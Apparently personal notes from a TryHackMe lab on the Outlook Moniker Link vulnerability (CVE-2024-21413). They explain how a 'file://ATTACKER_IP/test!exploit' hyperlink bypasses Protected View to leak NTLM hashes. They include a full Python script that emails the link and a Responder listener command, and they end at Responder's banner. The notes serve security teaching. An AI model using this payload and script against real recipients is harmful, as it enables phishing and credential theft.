On February 13th, 2024, Microsoft announced a Microsoft Outlook RCE & credential leak vulnerability with the assigned CVE of [CVE-2024-21413](https://www.cve.org/CVERecord?id=CVE-2024-21413) (Moniker Link). Haifei Li of Check Point Research is credited with [discovering the vulnerability](https://research.checkpoint.com/2024/the-risks-of-the-monikerlink-bug-in-microsoft-outlook-and-the-big-picture/).

The vulnerability bypasses Outlook's security mechanisms when handing a specific type of hyperlink known as a Moniker Link. An attacker can abuse this by sending an email that contains a malicious Moniker Link to a victim, resulting in Outlook sending the user's NTLM credentials to the attacker once the hyperlink is clicked.

Details relating to the scoring of the vulnerability have been provided in the table below:
![[Pasted image 20250728170153.png]]
Outlook can render emails as HTML. You may notice this being used by your favourite newsletters. Additionally, Outlook can parse hyperlinks such as HTTP and HTTPS. However, it can also open URLs specifying applications known as [Moniker Links](https://learn.microsoft.com/en-us/windows/win32/com/url-monikers). Normally, Outlook will prompt a security warning when external applications are triggered.

![Outlooks Protected View is triggered when launching an external application](https://research.checkpoint.com/wp-content/uploads/2024/02/HBNP4GTD5Y-image1.png)  

This pop-up is a result of Outlook's "Protected View". Protected View opens emails containing attachments, hyperlinks and similar content in read-only mode, blocking things such as macros (especially from outside an organization).
By using the `file://` Moniker Link in our hyperlink, we can instruct Outlook to attempt to access a file, such as a file on a network share (`<a href="file://ATTACKER_IP/test">Click me</a>`). The SMB protocol is used, which involves using local credentials for authentication. However, Outlook's "Protected View" catches and blocks this attempt.
The vulnerability here exists by modifying our hyperlink to include the `!` special character and some text in our Moniker Link which results in bypassing Outlook’s Protected View. For example: `<a href="file://ATTACKER_IP/test!exploit">Click me</a>`.
We, as attackers, can provide a Moniker Link of this nature for the attack. Note the share does not need to exist on the remote device, as an authentication attempt will be attempted regardless, leading to the victim's Windows netNTLMv2 hash being sent to the attacker.

Remote Code Execution (RCE) is possible because Moniker Links uses the Component Object Model (COM) on Windows. However, explaining this is currently out of scope for this room, as there is no publicly released proof of concept for achieving RCE via this specific CVE.

# Exploitation
For this attack, we will email our victim a Moniker Link similar to the one provided in the previous task. The objective, as the attacker, is to craft an email to the victim with a Moniker Link that bypasses Outlook's "Protected View", where the victim’s client will attempt to load a file from our attacking machine, resulting in the victim’s netNTLMv2 hash being captured.

But first, let’s run through a PoC I have created (which is also available on [GitHub](https://github.com/CMNatic/CVE-2024-21413)).
```python
'''
Author: CMNatic | https://github.com/cmnatic
Version: 1.0 | 19/02/2024
'''

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

sender_email = 'attacker@monikerlink.thm' # Replace with your sender email address
receiver_email = 'victim@monikerlink.thm' # Replace with the recipient email address
password = input("Enter your attacker email password: ")
html_content = """\
<!DOCTYPE html>
<html lang="en">
    <p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>

    </body>
</html>"""

message = MIMEMultipart()
message['Subject'] = "CVE-2024-21413"
message["From"] = formataddr(('CMNatic', sender_email))
message["To"] = receiver_email

# Convert the HTML string into bytes and attach it to the message object
msgHtml = MIMEText(html_content,'html')
message.attach(msgHtml)

server = smtplib.SMTP('MAILSERVER', 25)
server.ehlo()
try:
    server.login(sender_email, password)
except Exception as err:
    print(err)
    exit(-1)

try:
    server.sendmail(sender_email, [receiver_email], message.as_string())
    print("\n Email delivered")
except Exception as error:
    print(error)
finally:
    server.quit()
```
The PoC:

- Takes an attacker & victim email. Normally, you would need to use your own SMTP server (this has already been provided for you in this room)
- Requires the password to authenticate. For this room, the password for **attacker@monikerlink.thm** is **attacker**
- Contains the email content (html_content), which contains our Moniker Link as a HTML hyperlink
- Then, fill in the "subject", "from" and "to" fields in the email
- Finally, it sends the email to the mail server

Let’s use Responder to create an SMB listener on our attacking machine. For the THM AttackBox, the interface will be `-I ens5`. The interface name will differ if you are using your own device (i.e. Kali). If you would like some homework, an Impacket server can also be used.
```shell-session
root@attackbox:# responder -I ens5
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.1.0
